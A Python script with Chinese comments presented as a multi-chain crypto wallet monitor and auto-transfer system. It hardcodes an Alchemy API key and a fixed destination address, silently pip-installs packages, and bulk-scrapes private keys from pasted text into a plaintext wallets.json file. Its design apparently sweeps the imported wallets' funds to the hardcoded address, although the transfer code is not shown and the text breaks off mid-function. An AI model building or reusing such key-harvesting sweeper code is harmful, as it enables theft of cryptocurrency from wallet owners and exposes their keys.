#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
钱包监控转账系统 v3.0 - 纯RPC网络版
支持多个EVM/L2链条的钱包监控和自动转账
纯RPC网络架构，覆盖多条主流链条
优化API速度和菜单交互体验，支持Base、Linea、Scroll、zkSync、BSC、AVAX等
"""

import os
import sys
import json
import asyncio
import time
import re
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
import concurrent.futures
import logging
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
import requests.sessions

# 自动安装依赖
def auto_install_dependencies():
    """自动检测并安装缺少的依赖"""
    required_packages = {
        'web3': 'web3',
        'eth_account': 'eth-account',
        'colorama': 'colorama',
        'aiohttp': 'aiohttp',
        'cryptography': 'cryptography',
        'requests': 'requests',
        'urllib3': 'urllib3'
    }
    
    missing_packages = []
    for module_name, package_name in required_packages.items():
        try:
            __import__(module_name)
        except ImportError:
            missing_packages.append(package_name)
    
    if missing_packages:
        print(f"❌ 缺少必要的依赖包: {', '.join(missing_packages)}")
        print("💡 正在自动安装...")
        
        import subprocess
        for package in missing_packages:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                print(f"✅ {package} 安装成功")
            except:
                try:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--user', package])
                    print(f"✅ {package} 安装成功 (用户模式)")
                except:
                    print(f"❌ {package} 安装失败")
                    return False
    return True

# 确保依赖可用
if not auto_install_dependencies():
    print("❌ 依赖安装失败，请手动安装")
    sys.exit(1)

# 导入依赖
try:
    from web3 import Web3
    from eth_account import Account
    from colorama import Fore, Style, init
    import aiohttp
    import cryptography
    import requests
    
    # 初始化colorama
    init(autoreset=True)
    
except ImportError as e:
    print(f"❌ 导入依赖失败: {e}")
    print("💡 请运行 wallet_monitor_launcher.py 来自动安装依赖")
    sys.exit(1)

# 配置
ALCHEMY_API_KEY = "MYr2ZG1P7bxc4F1qVTLIj"
TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"

# 数据文件
WALLETS_FILE = "wallets.json"
MONITORING_LOG_FILE = "monitoring_log.json"
CONFIG_FILE = "config.json"
NETWORK_STATUS_FILE = "network_status.json"

# 完整的EVM/L2链条配置（纯RPC模式）
ALCHEMY_NETWORK_CONFIG = {
    # Ethereum
    'ethereum': {
        'name': 'Ethereum 主网',
        'chain_id': 1,
        'currency': 'ETH',
        'rpc_url': f'https://eth-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 1
    },
    'ethereum_sepolia': {
        'name': 'Ethereum Sepolia',
        'chain_id': 11155111,
        'currency': 'ETH',

        'rpc_url': f'https://eth-sepolia.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 2
    },
    'ethereum_goerli': {
        'name': 'Ethereum Goerli',
        'chain_id': 5,
        'currency': 'ETH',

        'rpc_url': f'https://eth-goerli.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 3
    },
    
    # Polygon
    'polygon': {
        'name': 'Polygon 主网',
        'chain_id': 137,
        'currency': 'MATIC',

        'rpc_url': f'https://polygon-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 4
    },
    'polygon_mumbai': {
        'name': 'Polygon Mumbai',
        'chain_id': 80001,
        'currency': 'MATIC',

        'rpc_url': f'https://polygon-mumbai.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 5
    },
    'polygon_amoy': {
        'name': 'Polygon Amoy',
        'chain_id': 80002,
        'currency': 'MATIC',
        'sdk_network': None,
        'rpc_url': f'https://polygon-amoy.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 6
    },
    
    # Arbitrum
    'arbitrum': {
        'name': 'Arbitrum 主网',
        'chain_id': 42161,
        'currency': 'ETH',

        'rpc_url': f'https://arb-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 7
    },
    'arbitrum_goerli': {
        'name': 'Arbitrum Goerli',
        'chain_id': 421613,
        'currency': 'ETH',

        'rpc_url': f'https://arb-goerli.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 8
    },
    'arbitrum_sepolia': {
        'name': 'Arbitrum Sepolia',
        'chain_id': 421614,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://arb-sepolia.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 9
    },
    'arbitrum_nova': {
        'name': 'Arbitrum Nova',
        'chain_id': 42170,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://arbnova-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 10
    },
    
    # Optimism
    'optimism': {
        'name': 'Optimism 主网',
        'chain_id': 10,
        'currency': 'ETH',

        'rpc_url': f'https://opt-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 11
    },
    'optimism_goerli': {
        'name': 'Optimism Goerli',
        'chain_id': 420,
        'currency': 'ETH',

        'rpc_url': f'https://opt-goerli.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 12
    },
    'optimism_kovan': {
        'name': 'Optimism Kovan',
        'chain_id': 69,
        'currency': 'ETH',

        'rpc_url': f'https://opt-kovan.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 13
    },
    'optimism_sepolia': {
        'name': 'Optimism Sepolia',
        'chain_id': 11155420,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://opt-sepolia.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 14
    },
    
    # Base
    'base': {
        'name': 'Base 主网',
        'chain_id': 8453,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://base-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 15
    },
    'base_sepolia': {
        'name': 'Base Sepolia',
        'chain_id': 84532,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://base-sepolia.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 16
    },
    
    # Polygon zkEVM
    'polygon_zkevm': {
        'name': 'Polygon zkEVM',
        'chain_id': 1101,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://polygonzkevm-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 17
    },
    'polygon_zkevm_testnet': {
        'name': 'Polygon zkEVM Testnet',
        'chain_id': 1442,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://polygonzkevm-testnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 18
    },
    
    # zkSync Era
    'zksync': {
        'name': 'zkSync Era',
        'chain_id': 324,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://zksync-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 19
    },
    'zksync_sepolia': {
        'name': 'zkSync Sepolia',
        'chain_id': 300,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://zksync-sepolia.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 20
    },
    
    # Linea
    'linea': {
        'name': 'Linea 主网',
        'chain_id': 59144,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://linea-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 21
    },
    'linea_sepolia': {
        'name': 'Linea Sepolia',
        'chain_id': 59141,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://linea-sepolia.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 22
    },
    
    # Scroll
    'scroll': {
        'name': 'Scroll 主网',
        'chain_id': 534352,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://scroll-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 23
    },
    'scroll_sepolia': {
        'name': 'Scroll Sepolia',
        'chain_id': 534351,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://scroll-sepolia.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 24
    },
    
    # BSC (Binance Smart Chain)
    'bsc': {
        'name': 'BNB Smart Chain',
        'chain_id': 56,
        'currency': 'BNB',
        'sdk_network': None,
        'rpc_url': f'https://bnb-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 25
    },
    'bsc_testnet': {
        'name': 'BNB Smart Chain Testnet',
        'chain_id': 97,
        'currency': 'BNB',
        'sdk_network': None,
        'rpc_url': f'https://bnb-testnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 26
    },
    
    # Avalanche
    'avalanche': {
        'name': 'Avalanche C-Chain',
        'chain_id': 43114,
        'currency': 'AVAX',
        'sdk_network': None,
        'rpc_url': f'https://avax-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 27
    },
    'avalanche_fuji': {
        'name': 'Avalanche Fuji',
        'chain_id': 43113,
        'currency': 'AVAX',
        'sdk_network': None,
        'rpc_url': f'https://avax-fuji.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 28
    },
    
    # 其他重要EVM/L2链条...
    'blast': {
        'name': 'Blast 主网',
        'chain_id': 81457,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://blast-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 29
    },
    'zetachain': {
        'name': 'ZetaChain 主网',
        'chain_id': 7000,
        'currency': 'ZETA',
        'sdk_network': None,
        'rpc_url': f'https://zetachain-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 30
    },
    'celo': {
        'name': 'Celo 主网',
        'chain_id': 42220,
        'currency': 'CELO',
        'sdk_network': None,
        'rpc_url': f'https://celo-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 31
    },
    'astar': {
        'name': 'Astar 主网',
        'chain_id': 592,
        'currency': 'ASTR',

        'rpc_url': f'https://astar-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 32
    },
    
    # 更多主流EVM/L2链条
    'gnosis': {
        'name': 'Gnosis Chain',
        'chain_id': 100,
        'currency': 'xDAI',
        'sdk_network': None,
        'rpc_url': f'https://gnosis-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 33
    },
    'gnosis_chiado': {
        'name': 'Gnosis Chiado',
        'chain_id': 10200,
        'currency': 'xDAI',
        'sdk_network': None,
        'rpc_url': f'https://gnosis-chiado.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'testnet',
        'priority': 34
    },
    'metis': {
        'name': 'Metis 主网',
        'chain_id': 1088,
        'currency': 'METIS',
        'sdk_network': None,
        'rpc_url': f'https://metis-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 35
    },
    'soneium': {
        'name': 'Soneium 主网',
        'chain_id': 1946,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://soneium-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 36
    },
    'world_chain': {
        'name': 'World Chain',
        'chain_id': 480,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://worldchain-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 37
    },
    'shape': {
        'name': 'Shape 主网',
        'chain_id': 360,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://shape-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 38
    },
    'unichain': {
        'name': 'Unichain 主网',
        'chain_id': 1301,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://unichain-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 39
    },
    'apechain': {
        'name': 'ApeChain 主网',
        'chain_id': 33139,
        'currency': 'APE',
        'sdk_network': None,
        'rpc_url': f'https://apechain-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 40
    },
    'abstract': {
        'name': 'Abstract 主网',
        'chain_id': 11124,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://abstract-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 41
    },
    'lumia': {
        'name': 'Lumia 主网',
        'chain_id': 994873017,
        'currency': 'LUMIA',
        'sdk_network': None,
        'rpc_url': f'https://lumia-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 42
    },
    'ink': {
        'name': 'Ink 主网',
        'chain_id': 57073,
        'currency': 'ETH',
        'sdk_network': None,
        'rpc_url': f'https://ink-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 43
    },
    'rootstock': {
        'name': 'Rootstock 主网',
        'chain_id': 30,
        'currency': 'RBTC',
        'sdk_network': None,
        'rpc_url': f'https://rootstock-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 44
    },
    'sonic': {
        'name': 'Sonic 主网',
        'chain_id': 146,
        'currency': 'S',
        'sdk_network': None,
        'rpc_url': f'https://sonic-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 45
    },
    'sei': {
        'name': 'Sei 主网',
        'chain_id': 1329,
        'currency': 'SEI',
        'sdk_network': None,
        'rpc_url': f'https://sei-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
        'type': 'mainnet',
        'priority': 46
    }
}

def build_supported_networks():
    """构建纯RPC网络系统"""
    supported_networks: Dict[str, Any] = {}
    network_names: Dict[str, str] = {}
    mainnets: List[str] = []
    testnets: List[str] = []
    network_priority: Dict[str, int] = {}
    
    # 处理所有配置的网络（纯RPC模式）
    for network_key, config in ALCHEMY_NETWORK_CONFIG.items():
        # 所有网络都使用RPC模式
        supported_networks[network_key] = {
            'mode': 'rpc',
            'config': config
        }
        
        network_names[network_key] = config['name']
        network_priority[network_key] = config['priority']
        
        if config['type'] == 'mainnet':
            mainnets.append(network_key)
        else:
            testnets.append(network_key)
    
    return supported_networks, network_names, mainnets, testnets, network_priority

# 构建支持的网络配置
SUPPORTED_NETWORKS, NETWORK_NAMES, MAINNET_NETWORKS, TESTNET_NETWORKS, NETWORK_PRIORITY = build_supported_networks()

# 配置日志记录
logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')

class ConnectionManager:
    """连接管理器 - 处理HTTP连接池和超时"""
    
    def __init__(self, max_retries=3, backoff_factor=0.3, timeout=10):
        self.max_retries = max_retries
        self.backoff_factor = backoff_factor
        self.timeout = timeout
        self.session_pool = {}
        
        # 配置重试策略
        self.retry_strategy = Retry(
            total=max_retries,
            status_forcelist=[429, 500, 502, 503, 504],
            backoff_factor=backoff_factor,
            respect_retry_after_header=True
        )
    
    def get_session(self, network_key: str) -> requests.Session:
        """获取或创建HTTP会话"""
        if network_key not in self.session_pool:
            session = requests.Session()
            
            # 配置适配器和重试策略
            adapter = HTTPAdapter(
                max_retries=self.retry_strategy,
                pool_connections=1,
                pool_maxsize=1,
                pool_block=False
            )
            
            session.mount("http://", adapter)
            session.mount("https://", adapter)
            
            # 设置超时
            session.timeout = self.timeout
            
            self.session_pool[network_key] = session
            
        return self.session_pool[network_key]
    
    def close_all_sessions(self):
        """关闭所有会话"""
        for session in self.session_pool.values():
            try:
                session.close()
            except:
                pass
        self.session_pool.clear()
    
    def __del__(self):
        """析构函数，清理资源"""
        self.close_all_sessions()

# 全局连接管理器
connection_manager = ConnectionManager()

@dataclass
class WalletInfo:
    """钱包信息"""
    address: str
    private_key: str
    enabled_networks: List[str]
    last_checked: Dict[str, str]

@dataclass 
class NetworkStatus:
    """网络状态"""
    available: bool
    last_check: str
    error_count: int
    last_error: str

class WalletMonitor:
    """钱包监控器 - 纯RPC网络支持版"""
    
    def __init__(self):
        self.wallets: List[WalletInfo] = []
        self.web3_clients: Dict[str, Web3] = {}        # RPC模式客户端
        self.monitoring_active = False
        self.network_status: Dict[str, NetworkStatus] = {}
        self.load_wallets()
        self.load_network_status()
        
        # 注册清理函数
        import atexit
        atexit.register(self.cleanup)
    
    def cleanup(self):
        """清理资源"""
        try:
            # 关闭连接管理器的所有会话
            connection_manager.close_all_sessions()
            
            # 保存网络状态
            self.save_network_status()
            
            # 清理Web3客户端
            self.web3_clients.clear()
            
            print(f"{Fore.GREEN}🧹 资源清理完成{Style.RESET_ALL}")
        except:
            pass
        
    def initialize_clients(self):
        """并发初始化所有网络客户端 - 纯RPC模式"""
        print(f"\n{Fore.CYAN}🔧 并发初始化 {len(SUPPORTED_NETWORKS)} 个RPC网络客户端...{Style.RESET_ALL}")
        
        def init_single_client(network_item):
            network_key, network_info = network_item
            try:
                config = network_info['config']
                
                # 添加小延迟避免API限制
                import time
                time.sleep(0.1)
                
                # 纯RPC模式 - 改进的连接配置
                request_kwargs = {
                    'timeout': (5, 10),  # (连接超时, 读取超时)
                    'headers': {
                        'User-Agent': 'WalletMonitor/3.0',
                        'Connection': 'keep-alive'
                    }
                }
                
                web3 = Web3(Web3.HTTPProvider(
                    config['rpc_url'], 
                    request_kwargs=request_kwargs
                ))
                
                # 测试连接 - 添加超时控制
                import signal
                def timeout_handler(signum, frame):
                    raise TimeoutError("Connection test timeout")
                
                signal.signal(signal.SIGALRM, timeout_handler)
                signal.alarm(8)  # 8秒超时
                
                try:
                    block_number = web3.eth.get_block_number()
                    signal.alarm(0)  # 取消超时
                    return network_key, web3, True, None
                except Exception as e:
                    signal.alarm(0)  # 取消超时
                    raise e
                    
            except Exception as e:
                return network_key, None, False, str(e)
        
        # 使用线程池并发初始化（降低并发数避免API限制）
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
            # 按优先级排序，只初始化前20个网络避免API限制
            sorted_networks = sorted(SUPPORTED_NETWORKS.items(), 
                                   key=lambda x: NETWORK_PRIORITY.get(x[0], 999))
            
            # 只初始化前10个网络，避免API限制
            priority_networks = sorted_networks[:10]
            futures = [executor.submit(init_single_client, item) for item in priority_networks]
            
            success_count = 0
            mainnet_count = 0
            testnet_count = 0
            
            for future in concurrent.futures.as_completed(futures):
                network_key, client, success, error = future.result()
                
                if success:
                    # 存储RPC客户端
                    self.web3_clients[network_key] = client
                    
                    self.network_status[network_key] = NetworkStatus(
                        available=True,
                        last_check=datetime.now().isoformat(),
                        error_count=0,
                        last_error=""
                    )
                    
                    # 分类统计
                    if network_key in MAINNET_NETWORKS:
                        mainnet_count += 1
                        print(f"{Fore.GREEN}🌐 {NETWORK_NAMES[network_key]} (主网-RPC){Style.RESET_ALL}")
                    else:
                        testnet_count += 1
                        print(f"{Fore.CYAN}🌐 {NETWORK_NAMES[network_key]} (测试网-RPC){Style.RESET_ALL}")
                    
                    success_count += 1
                else:
                    self.network_status[network_key] = NetworkStatus(
                        available=False,
                        last_check=datetime.now().isoformat(),
                        error_count=1,
                        last_error=error
                    )
                    print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} (RPC) - {error[:50]}...{Style.RESET_ALL}")
        
        self.save_network_status()
        
        print(f"\n{Fore.GREEN}🎉 RPC网络系统初始化完成!{Style.RESET_ALL}")
        print(f"  📊 总计: {success_count}/10 个优先网络可用 (避免API限制)")
        print(f"  🌐 主网: {mainnet_count} 个")
        print(f"  🧪 测试网: {testnet_count} 个")
        print(f"  🌐 RPC模式: {success_count} 个")
        print(f"  💡 其他网络将在需要时动态加载")
    
    def load_network_on_demand(self, network_key: str) -> bool:
        """按需加载网络客户端"""
        if network_key in self.web3_clients:
            return True
            
        try:
            network_info = SUPPORTED_NETWORKS.get(network_key)
            if not network_info:
                return False
                
            config = network_info['config']
            
            # 改进的连接配置
            request_kwargs = {
                'timeout': (3, 8),  # 更短的超时时间
                'headers': {
                    'User-Agent': 'WalletMonitor/3.0',
                    'Connection': 'keep-alive'
                }
            }
            
            web3 = Web3(Web3.HTTPProvider(config['rpc_url'], request_kwargs=request_kwargs))
            
            # 测试连接 - 添加超时控制
            import signal
            def timeout_handler(signum, frame):
                raise TimeoutError("Dynamic load timeout")
                
            signal.signal(signal.SIGALRM, timeout_handler)
            signal.alarm(5)  # 5秒超时
            
            try:
                web3.eth.get_block_number()
                signal.alarm(0)  # 取消超时
            except Exception as e:
                signal.alarm(0)  # 取消超时
                raise e
            
            # 存储客户端
            self.web3_clients[network_key] = web3
            
            # 更新状态
            self.network_status[network_key] = NetworkStatus(
                available=True,
                last_check=datetime.now().isoformat(),
                error_count=0,
                last_error=""
            )
            
            print(f"{Fore.GREEN}🔗 动态加载 {NETWORK_NAMES[network_key]} 成功{Style.RESET_ALL}")
            return True
            
        except Exception as e:
            self.network_status[network_key] = NetworkStatus(
                available=False,
                last_check=datetime.now().isoformat(),
                error_count=1,
                last_error=str(e)
            )
            print(f"{Fore.YELLOW}⚠️ 动态加载 {NETWORK_NAMES[network_key]} 失败: {str(e)[:30]}...{Style.RESET_ALL}")
            return False
    
    def load_network_status(self):
        """加载网络状态缓存"""
        if os.path.exists(NETWORK_STATUS_FILE):
            try:
                with open(NETWORK_STATUS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.network_status = {
                        k: NetworkStatus(**v) for k, v in data.items()
                    }
            except:
                self.network_status = {}
    
    def save_network_status(self):
        """保存网络状态"""
        try:
            data = {k: v.__dict__ for k, v in self.network_status.items()}
            with open(NETWORK_STATUS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except:
            pass
    
    def load_wallets(self):
        """加载钱包数据"""
        if os.path.exists(WALLETS_FILE):
            try:
                with open(WALLETS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.wallets = [WalletInfo(**wallet) for wallet in data]
            except Exception as e:
                print(f"{Fore.YELLOW}⚠️ 加载钱包数据失败: {e}{Style.RESET_ALL}")
                self.wallets = []
    
    def save_wallets(self):
        """保存钱包数据"""
        try:
            data = [wallet.__dict__ for wallet in self.wallets]
            with open(WALLETS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"{Fore.RED}❌ 保存钱包数据失败: {e}{Style.RESET_ALL}")
    
    def extract_private_keys(self, text: str) -> List[str]:
        """智能提取私钥 - 增强版本"""
        patterns = [
            r'0x[a-fA-F0-9]{64}',  # 带0x前缀的64位十六进制
            r'[a-fA-F0-9]{64}',    # 不带前缀的64位十六进制
        ]
        
        private_keys = []
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                key = match.lower()
                if not key.startswith('0x'):
                    key = '0x' + key
                
                try:
                    Account.from_key(key)
                    if key not in private_keys:
                        private_keys.append(key)
                except:
                    continue
        
        return private_keys
    
    def print_progress_bar(self, current: int, total: int, prefix: str = "进度", width: int = 40):
        """显示进度条 - 增强版本"""
        percent = int(100 * current / total)
        filled_length = int(width * current / total)
        bar = '█' * filled_length + '░' * (width - filled_length)
        
        # 添加颜色
        if percent < 30:
            color = Fore.RED
        elif percent < 70:
            color = Fore.YELLOW
        else:
            color = Fore.GREEN
            
        print(f"\r{color}{prefix}: [{bar}] {percent}% ({current}/{total}){Style.RESET_ALL}", 
              end='', flush=True)
    
    def import_private_keys_menu(self):
        """导入私钥菜单 - 完全优化版本"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📥 智能批量导入私钥系统{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}🚀 智能识别功能:{Style.RESET_ALL}")
        print("  ✓ 自动识别64位十六进制私钥")
        print("  ✓ 支持0x前缀和无前缀格式")
        print("  ✓ 从任意格式文本中智能提取")
        print("  ✓ 自动验证私钥有效性")
        print("  ✓ 智能去重，避免重复导入")
        
        print(f"\n{Fore.YELLOW}📋 操作指南:{Style.RESET_ALL}")
        print("  1️⃣ 粘贴包含私钥的文本内容")
        print("  2️⃣ 私钥可以混在其他内容中")
        print("  3️⃣ 双击回车键确认导入")
        print("  4️⃣ 输入 'q'、'quit' 或 'exit' 返回主菜单")
        
        collected_text = ""
        empty_line_count = 0
        line_count = 0
        
        print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📝 请粘贴私钥文本 (双击回车确认):{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        
        while True:
            try:
                line = input()
                if line.strip().lower() in ['q', 'quit', 'exit']:
                    print(f"\n{Fore.YELLOW}🔙 返回主菜单{Style.RESET_ALL}")
                    time.sleep(1)
                    return
                
                if line.strip() == "":
                    empty_line_count += 1
                    if empty_line_count >= 2:
                        break
                else:
                    empty_line_count = 0
                    collected_text += line + "\n"
                    line_count += 1
                    print(f"{Fore.GREEN}✓ 第{line_count}行已接收{Style.RESET_ALL}")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}🔙 返回主菜单{Style.RESET_ALL}")
                return
        
        if not collected_text.strip():
            print(f"\n{Fore.YELLOW}⚠️ 未输入任何内容{Style.RESET_ALL}")
            input(f"{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}🔍 正在智能分析文本内容...{Style.RESET_ALL}")
        time.sleep(0.5)  # 视觉效果
        
        private_keys = self.extract_private_keys(collected_text)
        
        if not private_keys:
            print(f"{Fore.RED}❌ 未找到有效的私钥{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 请确保私钥格式正确 (64位十六进制字符串){Style.RESET_ALL}")
            print(f"{Fore.CYAN}🔍 支持格式示例:{Style.RESET_ALL}")
            print(f"  • 0x1234567890abcdef... (带0x前缀)")
            print(f"  • 1234567890abcdef... (不带前缀)")
            input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}🎉 发现 {len(private_keys)} 个有效私钥!{Style.RESET_ALL}")
        
        # 验证和处理私钥
        new_wallets = []
        existing_addresses = {wallet.address.lower() for wallet in self.wallets}
        
        print(f"\n{Fore.CYAN}🔄 正在验证私钥和生成地址...{Style.RESET_ALL}")
        for i, private_key in enumerate(private_keys, 1):
            self.print_progress_bar(i, len(private_keys), "验证进度")
            try:
                account = Account.from_key(private_key)
                address = account.address
                
                if address.lower() not in existing_addresses:
                    wallet_info = WalletInfo(
                        address=address,
                        private_key=private_key,
                        enabled_networks=list(SUPPORTED_NETWORKS.keys()),
                        last_checked={}
                    )
                    new_wallets.append(wallet_info)
                    existing_addresses.add(address.lower())
            except Exception as e:
                continue
        
        print()  # 换行
        
        # 显示结果
        if new_wallets:
            print(f"\n{Fore.GREEN}📋 新钱包预览 ({len(new_wallets)} 个):{Style.RESET_ALL}")
            for i, wallet in enumerate(new_wallets, 1):
                short_addr = f"{wallet.address[:10]}...{wallet.address[-8:]}"
                print(f"  {i:2d}. {short_addr}")
            
            existing_count = len(private_keys) - len(new_wallets)
            if existing_count > 0:
                print(f"\n{Fore.YELLOW}💡 跳过 {existing_count} 个已存在的钱包{Style.RESET_ALL}")
            
            print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}📊 导入摘要:{Style.RESET_ALL}")
            print(f"  🆕 新钱包: {len(new_wallets)} 个")
            print(f"  🔄 重复钱包: {existing_count} 个")
            print(f"  🌐 支持网络: {len(SUPPORTED_NETWORKS)} 个")
            print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            
            confirm = input(f"\n{Fore.CYAN}确认导入这 {len(new_wallets)} 个新钱包? (y/N): {Style.RESET_ALL}")
            
            if confirm.lower() in ['y', 'yes']:
                self.wallets.extend(new_wallets)
                self.save_wallets()
                print(f"\n{Fore.GREEN}🎉 导入成功!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}💼 当前总钱包数: {len(self.wallets)} 个{Style.RESET_ALL}")
                print(f"{Fore.GREEN}🌐 每个钱包支持: {len(SUPPORTED_NETWORKS)} 个网络{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}❌ 取消导入{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}💡 所有私钥对应的钱包都已存在{Style.RESET_ALL}")
            print(f"{Fore.CYAN}💼 当前钱包总数: {len(self.wallets)} 个{Style.RESET_ALL}")
        
        input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
    
    async def check_address_activity_optimized(self, address: str, network_key: str) -> bool:
        """优化的地址活动检查 - 纯RPC模式"""
        # 检查网络状态
        network_status = self.network_status.get(network_key)
        if network_status and not network_status.available:
